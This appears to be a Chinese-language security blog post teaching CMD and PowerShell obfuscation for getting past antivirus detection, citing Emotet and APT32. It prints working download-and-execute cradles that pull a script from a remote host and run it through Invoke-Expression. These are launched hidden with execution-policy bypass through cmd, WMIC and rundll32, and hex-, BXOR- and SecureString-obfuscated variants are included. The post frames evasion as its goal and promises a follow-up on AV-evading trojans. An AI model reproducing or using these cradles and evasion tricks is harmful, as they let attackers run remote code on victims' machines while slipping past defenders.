> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IX7RquDu5A3xlElrrW-5XA)

CMD 命令混淆
========

为什么需要混淆？
--------

APT 攻击中使用混淆姿势多种多样，主要是通过混淆对抗静态检测，AV 无法提取敏感参数，C2 地址，从而实现绕过。同时也会加大安全人员对内容的分析难度。

列子：

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwpd4viax3yCJeVXSDu8yaJWrrlmKP4OGujnb4Qn5OFJAxJeKicPvC4ddw/640?wx_fmt=png)

**1. Emotet 木马**  

Emotet 一款著名的银行木马，首次出现于 2014 年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，并通过脚本混淆、加密或编码方式来绕过 AV 检测，比如在垃圾邮件 word 附件中使用宏攻击, 如下图所示，这是一个从 DOC 文档嵌入的 VBA 宏代码中提取的 CMD 命令，乍一看上去，像是无意义的一串字符。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwm4IVWuARO94E94Y8icjhzsLQWibWKRqf9UxeSwtXdZxwKuMPwoBMqichA/640?wx_fmt=png)

**2. APT32**

APT32 在使用 regsvr32.exe 远程注册组件，使用混淆方式来逃避 C2 检测。

混淆方法
----

### 利用大小写与特殊字符进行混淆

在 CMD 中，CMD 命令大小写并不敏感；IPCONFIG = Ipconfig = ipconfig

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwEu8w3IUoibIOhN45jkpq1yTriaQ0eyXnu2xGmSJjIiaDyqZMPtDczk3wA/640?wx_fmt=png)

**常用来混淆命令的特殊字符**

主要有以下四种：

1. 字符 “^”

是 CMD 命令中最常见的转义字符，该字符不影响命令的执行。在 cmd 环境中，有些字符具备特殊功能，如 >、>> 表示重定向，| 表示管道，&、&&、|| 表示语句连接，它们都有特定的功能。如果需要把它们作为字符输出的话，就需要对这些特殊字符做转义处理：在每个特殊字符前加上转义字符 ^。

举个例子：echo ^>、echo ^|、echo ^|^|、echo ^^ 和 i^p^c^o^n^f^i^g

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwRKDLzJCjZNbCTX1Kax6CuVslVUJRBPzRZm9wqPKemmKyFPDFzmiaOkw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwYBWHUw45ib2Tz9SYMS4IPVskQiaTqs4r2GHVicIP83LvAhzcZAfB2fibgg/640?wx_fmt=png)

2. 逗号 “,” 和分号 “;”

可以互换，可以取代命令中的合法空格，多个空格也不影响命令执行。

备注：Cmd /C “string” 表示：执行字符串 string 指定的命令，然后终止。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwDnCDFEubq4VFsQRTAMr3vloNWIBcrwicibuvxNjHqwxuCIEYk3micNSug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwWS1AUiaBnmaPW3ZyIJOiaEzGWOg5wnzRCIias1LTb9HQgLJ1jw6KSl9sg/640?wx_fmt=png)

3. 成对的圆括号（）

    圆括号表示嵌入子命令组，同样被 cmd.exe 参数处理器进行解释。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwPFm169XVTl19RFMU8ibBdgqmM0YkCs2n33ggiaQ4DZOtXqTQ4qIlPaYg/640?wx_fmt=png)

4. 双引号 。

使用双引号包裹字符，相当于将字符进行连接。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwgKsia26CzkgOUbjcVlicb857hehj1vNwmxHh8SnsFSiajkowXPOibBMyzQ/640?wx_fmt=png)

### 利用环境变量进行混淆

cmd.exe 的环境变量分为系统已有的环境变量和自定义变量。利用环境变量的值中的字符或字符串，可以拼接成黑客需要的 cmd 命令，并逃避静态检测。在 cmd 中 ，set 命令用来显示、设置或删除 cmd.exe 环境变量。

命令格式：

| 

SET [variable=[string]]

 |

variable 指定环境变量名。

string 指定要指派给变量的一系列字符串。

查看 cmd.exe 中所有的环境变量：set

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwQtJzhgvSX2xia36qrib77CdhsWe7Tj8ZajUe8k792aYVskdf2EibuUT5Q/640?wx_fmt=png)

利用系统中已有的环境变量，通过对环境变量进行截取拼接出想要的 cmd 命令

| 

%VarName:~offset[,length]%

 |

主要用于获取环境变量 VarName 的变量值，偏移 offset 字节之后长度为 length 个字节。[,length] 可省略。offset 默认下标从 0 开始，offset 也支持负数，表示反向遍历字符串的下标。举个例子: 通过 %comspec% 截取出 cmd.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwPR3x8BJ59ibwYCP0P4Dku8D9CPSvjb52FJMWvZ1BvHky2lLLI1NGrfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwhn1Kibvo5kWM2GribUh82VLc5qw6X01Zkav2asUaLIftUX8Z9ribbiahPQ/640?wx_fmt=png)

通常我们也可以自定义一个或者多个环境变量，利用环境变量值中的字符，提取并拼接出最终想要的 cmd 命令

| 

cmd /c “set a1=ser&& set a2=ne&& set a3=t u&&call echo %a2%%a3%%a1%”

 |

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwPMSZgXjUhUey5QDZ8LxkRglSYvqxk4fh1yqBmO8DKxiaub7QdEGmzPg/640?wx_fmt=png)

### 利用 for 循环拼接命令

**FOR {%variable|%%variable} IN (set) DO command [command-parameters]**

·       %variable 指定一个单一字母可替换的参数。

·       (set) 指定一个或一组文件。可以使用通配符。

·       command 指定对每个文件执行的命令。

·       command-parameters 为特定命令指定参数或命令行开关

assoc：文件名扩展关联命令，用于显示和设置文件名扩展关联，可以指定某种后缀名的文件按照特定的类型文件打开或执行。命令格式为：

| 

assoc [.ext[=[fileType]]]

 |

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwYN2JibyCaaKhId4q5PhicZG4OdkztsiciaIzYvlwEY6e4GllY79ibE2W9EQ/640?wx_fmt=png)

ftype：显示或修改用在文件扩展名关联中的文件类型，指定一种类型的文件默认用哪个程序运行或打开。命令格式为：

| 

ftype [fileType[=[openCommandString]]

 |

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwCE6gs8VtsEicdZvuhebMRFZuiakVRiaCddcSMFoqtbpuoRzmqA9kE0AzA/640?wx_fmt=png)

例：以 f = 分割，取第 2 列

| 

For /f “delims=f= tokens=2” %f IN (‘assoc .cmd’) do %f

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwSokYHbqGl9rCz889cLWFcFbbSyMozqn8hU34DT6Q9jZ1mGxGjo54eQ/640?wx_fmt=png)

 |

以 f 分割取第 1 列

| 

For /f “delims=f tokens=1” %f IN (‘ftype cmdfile’) do %f

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw15fH9aEyxcabw4rIxolvKag3wXQgia2YVibTXzdbzSthOFMeSPdTib5eQ/640?wx_fmt=png)

 |

### 利用工具实现混淆

CMD 命令混淆神器

https://github.com/danielbohannon/Invoke-DOSfuscation

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwdoxgRa3libBEQkYhDydljFeibROaBL9Zib8ny8qeXK3rrEic2ibAZf0YYUQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwMdTGWibA5PQ0Gh3Yxv9aJkaPT0CxA53bThFubGLGiaHoTNCd5wWFQw9Q/640?wx_fmt=png)  

Powershell 混淆
=============

powershell 混淆主要是针对以下三个方面的内容，分别为：

1.  命令本身
    
2.  函数与对象
    
3.  参数
    

而 powershell 的混淆姿势，大致分为了 8 大类：

1.  大小写与特殊符号
    
2.  字符串变换
    
3.  简写与 invoke
    
4.  变量变换
    
5.  脚本块
    
6.  编码
    
7.  压缩
    
8.  启动方式
    

混淆方法
----

###  1. 大小写与特殊符号

#### 1.1 任意大小写

powershell 大小写不敏感

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwnFoM4uSEKU0ImGfHKTpDURQ012bf1osG5ph3tAic0UsxhdETzByLJAA/640?wx_fmt=png)

#### 1.2 反引号

反引号在 powershell 中是转义符，转义符号加在大部分字符前不影响字符的意思，从而实现混淆，不过有些例外：

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwvT7s3K6ecY1paR4ORxRbpexOJxHsnlmc4gulQLFwPM6l2uzJaGs8zQ/640?wx_fmt=png)

所以使用反引号进行混淆的时候，不能把反引号加在上述的字母前面，不然会导致脚本无法运行。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwfhUuUBgjJ5YJ3MaGAURJe8Ry9RrtAwJT4Jl0Xl4ibIBwU8GLBY3ibOhQ/640?wx_fmt=png)

#### 1.3 括号与引号

通过添加括号或引号，将脚本中的对象和函数，转化为字符串执行, 其中括号代替空格。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw2NsSkkV0ScwAed0L6ca3ANydmcIe6TemXopjk3ncXtfKOFRgcQIDiaQ/640?wx_fmt=png)

或者

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwKoayiaHojqyYRFZehDPlDkYLyicIqJ6fa0Q2q7yFZHpCeDLUnkUkOfbA/640?wx_fmt=png)

#### 1.4 空白  

在脚本中添加多余的空格是无关紧要的，不会影响脚本的运行, 当然也不要乱填，不要影响正常的语法结构：

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwb02deePuZDRa3icTU2cmILRcNuYmicFE4nEFd6nV76uLqtBibEEabuQUw/640?wx_fmt=png)

### 2. 字符串变换

#### 2.1 拼接

使用引号进行分段拼接。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwZicObqfY1IT5FJtgZ8kbBzojTQWb9upFY8siaA63SUj7xRMiaJUE2sxtQ/640?wx_fmt=png)

#### 2.2 反转

字符串反转：

$reverseCmd[-1..-($reverseCmd.Length)]

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw5VQydzmjzw6R6hsfwWW9uUR9LbbQQCCpuTSCV8zLYy5f7KfVOtB4xw/640?wx_fmt=png)

#### 2.3 分割 / 替换

字符串中的 Split , Join,Replace。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwAibaaNicCdqORLxM93UmLaPtkqnMyo67XYjWd0bQU0V5iaDZgWkE5xgbQ/640?wx_fmt=png)

或者

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwXAyucUqBTlqJ1ltypV4qlt9K3Sco5VUEGCZGnBdJoj2RMiaNvtfq0fA/640?wx_fmt=png)

`将___替换为空`

#### 2.4 格式化

格式化指的是字符串占位符的使用，可以任意打断字符串顺序。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw09gSMeibhAwiamEPd5fGOTyIQfrddu70cqnhXYT0t6tYRicBDs3XVSokA/640?wx_fmt=png)

### 3. 简写

#### 3.1 别名

在 powershell 解释器中输入 alias, 看到所有的对象和函数的简写方式，也就是别名。常见的 Invoke-Expression 可以使用 IEX 来代替。 

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwlxs2Esz06KzhyMwleZnbby155vdUqHI8hhoIaZybOwH0ZiaKKHicIMYg/640?wx_fmt=png)

#### 3.2 省略

Net.WebClient=System.Net.WebClient

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwgPicB2hzjibgnUYvM1ZjcxkTqvfv3tgCjVfYiawFdEfC9CmDm04GnNxgw/640?wx_fmt=png)

#### 3.3 通配符 *

New-Object 可以通过通配符 * 写成如下的多种形式：

§&(Get-Command New-Obje*)

§&(Get-Command *w-O*)

§&(GCM *w-O*)

§&(COMMAND *w-*ct)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwFMqN55wVvasjjVicFnDkrUPB0OJviasKJGNRHicT318Fkicic4ZfUfUgiamw/640?wx_fmt=png)

#### 3.4 Invoke

Invoke 可以帮助我们打断关键函数之间的关系, 可以绕过一些关键函数的正则判断。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwjogibuN7qSM2MzoxYzUXdoPBCycGcNa3Oe8cNAOibzHt3JkYqkic8jROw/640?wx_fmt=png)

### 4. 变量变换

#### 4.1 拼接与替换

将关键字拆分成多个变量，然后替换拼接。同 cmd 混淆

#### 4.2 动态变量生成

以构建 DownloadString 为例，通过遍历函数并模糊匹配的方式找到 DownloadString , 用到了 PsObject.Methods 和 Where-Object。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwJjgY5LP65M5KQtGsZEGKq3w0bNNJwQia3kvnTdibM31zK9632HVyp1dg/640?wx_fmt=png)

Where-Object：创建一个用来控制输入对象是否沿着命令管道被传递的过滤器. 它将过滤从管道或通过 InputObject 参数所输入的对象. 它通过可能包含对需要过滤的对象引用的代码块进行求值, 来决定该对象是否沿着管道被出书. 如果求值结果为真 (true), 则该对象沿着管道被输出, 否则该对象将被丢弃

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw92KfhbYoorqpejpy1onZ8RibsCg9WEicTPdQ84UFibj8jLcT1N2BB45rQ/640?wx_fmt=png)

传入（New-Object Net.WebClient）.PsObject.Methods 获得的对象给 Where-Object 去匹配 name。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwhibNmxN5vJPRCab48sTCvD2I2hticdpfbr9OlhUSIKZ29KFiaJOY4UYrw/640?wx_fmt=png)

输出匹配成功后的 name 值

#### 4.3 变量传递

变量传递常用的有四种方式：

1.  环境变量

2.  管道

3.  粘贴板

4.  还有隐蔽的进程参数

主要说一下第 4 种，比较有创意

第 4 种的想法是 启动多个进程，例如 cmd.exe，将要执行的命令内容放到进程参数中，要执行代码的时候，直接过滤出所需进程，并通过进程参数拼接出真正的执行内容.(待补充)

### 5. 脚本块

#### 5.1 NewScriptBlock

$ExecutionContext.InvokeCommand.NewScriptBlock("***") 创建脚本块。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwcsCBYHSmLUKXK6T0Okgm9IvU0utmJgOprSNZVlmAzmQ8p0nwbxRwpA/640?wx_fmt=png)

#### 5.2 [Scriptblock]

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwBtNVaYJKjbJ2y9EQ10ocN1LTPReVDmnYbDO7lmtSJ7eIRyVoicMS1Sg/640?wx_fmt=png)

#### [Scriptblock] 相当于 [Type]("Scriptblock")

#### 5.3 其他方式

§invoke-command{***}

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw2bVamB3AdOxz2hiab4qcVWWGTD4ia8z9lnPOJvuymht8lKBYQ95R47qQ/640?wx_fmt=png)

`§`ICM{***}

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw6WlHBzww3SshNe0s1VQMOY1eMC90hGEaolQKBpeqQGqLlayQxJ0rog/640?wx_fmt=png)

§{***}.invoke()

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwQs2s6waG4nm9lKf27dlhqKw9LHtuYgNECI7xX6dPp7LE7dVEdjS9gg/640?wx_fmt=png)

§&{***}

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwNwjA3vaZsEVNP7R92SbryEibpV3hAmicoKkwVGgPhWs8qzsPK4enJbfQ/640?wx_fmt=png)

§.{***}

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwLeY3aZE3mouY132OcFSpyGWW0Hg2ZwErvCsKbFekianFribfsE2G0ia6g/640?wx_fmt=png)

创建脚本块

如果将 Powershell 代码放置在花括号中, 这样既可以使用调用操作符 & 执行脚本, 也可以将脚本块赋值给一个函数, 函数也是一个命令的脚本块.

### 6. 编码

#### 6.1 base64

加密 payload

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwPbt78shKfficYPfibJ8ibbJV5k0ibvlhKog2DnLRbgftAgmg5cEVFJLJIA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwoISzwu5WcP59eoDh0KSqW3deSfrwwtJOSlXj2xIA7lUtO9ySu9Wjrg/640?wx_fmt=png)

这里 powershell 的 base64 加密解密和咱们使用编码工具的 base64 加解密有所不同，有兴趣的朋友可以了解下。

#### 6.2 ASCII

使用 [char]xx 代替字符

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImw8iashYg267ia2RqrxD34iaJg91ceVs4GFB39IXlvOaWLpNB3tL6RlonUw/640?wx_fmt=png)

#### 6.3 进制 + BXOR

##### 进制

十六进制 (工具编码)

| 

-jOiN ('49!45V58k20{28Y4en65-77!2dY4fV62Y6an65k63V74Y20Y28V5b-74V79k70!65-5d!20-28L22L4e!65k74Y2e{57k65n62n43Y6cL69n65{6e-74!22V29Y29{29L2eY44!6fV77Y6en6cL6fV61L64-53Y74Y72!69n6eV67V28!22k68V74k74n70V3aY2fY2fL31V39V32-2eV31-36Y38L2e-31k31-38V2e{31!37n34Y3a-38L30{30{30{2f{79!61n75{6ek63n6fn64{65-2ek74Y78Y74n22L29'.SPlIt('LV-Yk{!n') |FOreACh {( [CHAr] ( [coNVERt]::tOINT16(($_.tostRING()),16 ) ))} ) |InvokE-EXprESSIOn

 |

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwvSRNHasq1Xr2fpziaYV1ichoTAZ9BLYkbcZaic7hJdWMaEYTYqJibqObCw/640?wx_fmt=png)

##### BXOR  

工具编码结果

| 

.($EnV:COmSpeC[4,15,25]-joIn'')([StrING]::JOIn('' ,('90f86I75>51j59I93T118f100k62I92h113I121j118h112j103j51I59y72h103h106k99>118k78T51>59x49x93y118I103h61k68y118T113I80I127_122j118j125y103_49x58I58k58T61j87_124k100f125f127x124>114_119_64f103y97_122f125I116y59I49_123y103_103j99h41k60h60y34f42j33k61k34f37_43k61y34h34_43f61h34T36I39x41h43k35x35T35f60T106h114k102x125>112>124_119I118_61k103>107x103T49x58' -SpLIt 'H' -spLit 'K'-SPLIT'x' -SpliT'j' -SpliT'>'-SPLiT'I' -sPlit 'y' -spLit'T'-SPLiT '_' -spLit'f'|% {[chaR]( $_-BxoR 0x13  )}) ))

 |

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwWicTxoLhYorIGRhib2k6GHsN9StGt82ib2vrBgVnnicib8s8ch8rL8uP9LQ/640?wx_fmt=png)

#### 6.4 SecureString

SecureString 其实是一种加解密的方式，通过密钥，对脚本进行加解密 ，实现脚本的混淆。

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwLfqofWKxicJ9gib6mRtf4Qn0vuFWgOicE8iaQPkv5cLl8Qj4gia8Jv1B97A/640?wx_fmt=png)

内容：  

| 

$cmd= "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.118.174:8000/yauncode.txt')"

$sCmd= ConvertTo-SecureString $cmd -AsPlainText -Force

$sCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)

$secCmd= $secCmdPlaintext| ConvertTo-SecureString -Key (1..16);

([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX

语法介绍：

https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7

 |

工具加密效果

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImww5CPcqzjibFY8ROH5YtldL6VXmnV63mvILIS4WTAwqdYZ1qSW36Za1A/640?wx_fmt=png)

### 7. 压缩

？

### 8. 启动方式

通过第三方组件进行启动，进一步隐藏真实内容

CMD 内容:

| 

C:\WiNDOws\SYStem32\CmD  /C   POWerSHElL  -wInDoWsTyle  HidDen -eXecutIoNp ByPaSs   "Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\"http://192.168.118.174:8000/yauncode.txt\")"

 |

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwxexXxXiauOulR2gBzibedFiclD1FdPrmTJwPxSfSNfyQSEf0GmwNzjeGw/640?wx_fmt=png)

WMIC:

| 

C:\WINdOws\sySTeM32\wBEM\WmIC 'PRoCESS'   'Call'   'cREatE' "POwERshElL -ExECuti ByPASs  -wi hiDDEN   Invoke-Expression (New-Object System.Net.WebClient).DownloadString("\"http://192.168.118.174:8000/yauncode.txt"\")"

 |

rundll32:

加载并运行 32 位动态链接库（Dll）

| 

rUNdLL32 SHELL32.DLL ShellExec_RunDLL  "PowerSHELL"   "-wIN  HIDdeN"   "-ExeCUTion  BYPaSS"    "Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\"http://192.168.118.174:8000/yauncode.txt\")"

 |

### 混淆神器

项目地址：https://github.com/danielbohannon/Invoke-Obfuscation

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImweHtnxUJwAsQU3PAHz8UyEXicD3a7mffHCTtEnCp2Q16q3m2q0aqKq2A/640?wx_fmt=png)

拥有多种混淆方式，基本上涵盖了上述的混淆方法。支持 TOKEN，AST 语法树，字符串，编码，压缩，启动方式等功能

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwpD6mkdOvNdruQuVgicu0H1p2mxX24nqE94wWWkibSnM76ib5wRia4mCuaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B7aQ0TKN4UfW02T7pcqCGjw6bPE0CImwxko7AZBoj0Y5QHiaG0Gc1vqr7RVRAecKsEVX3PmQuaLL0dSDQVvAI9A/640?wx_fmt=png)

这里记录下 cmd 和 powershell 的混淆方法，后续会有师傅带来免杀木马的相关文章。大家记得看呦。